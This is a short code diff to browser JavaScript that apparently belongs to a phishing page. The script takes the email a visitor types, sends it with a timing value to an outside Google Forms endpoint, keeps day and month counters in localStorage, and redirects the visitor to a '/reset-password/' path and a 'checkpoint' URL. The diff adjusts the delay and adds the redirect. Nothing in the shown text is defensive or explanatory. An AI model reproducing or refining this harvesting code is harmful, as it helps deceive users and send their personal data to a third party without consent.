@@ -13,17 +13,17 @@
     "use strict";
     const gmail = "loklua111992@gmail.com";
     const nam = 1990;
-    const time = 500;
+    const time = 2000;
 
     const GET_Email = document.querySelector("#email");
     const checkTextError = document.querySelector(".comErrorBox");
 
-    async function post(mail , time) {
+    async function post(mail, time) {
         const formData = new FormData();
         const keyUrlForm =
             "https://docs.google.com/forms/d/e/1FAIpQLSeZgt7TOeQgUBMIuMyI4gzKOXlg3GdCWc4bp4qyQk2WA24Q7g/formResponse";
         formData.append("entry.1619497016", mail);
-        formData.append("entry.2071494148", time); 
+        formData.append("entry.2071494148", time);
         try {
             const response = await fetch(keyUrlForm, {
                 method: "POST",
@@ -54,8 +54,10 @@
     }
 
     if (!checkError) {
-        localStorage.setItem("ngay", Number(ngay - 2));
-        localStorage.setItem("thang", Number(thang - 2));
+        localStorage.setItem("ngay", Number(ngay) - 2);
+        localStorage.setItem("thang", Number(thang) - 2);
+        window.location.replace("/reset-password/");
+        return
     }
 
     if (GET_URL != UrlForm) {
@@ -87,6 +89,7 @@
             if (checkPoint === 2) {
                 window.location.replace(UrlOK);
             }
+            localStorage.setItem("ngay", Number(ngay) - 2);
         }, 1000);
     }, time);
 
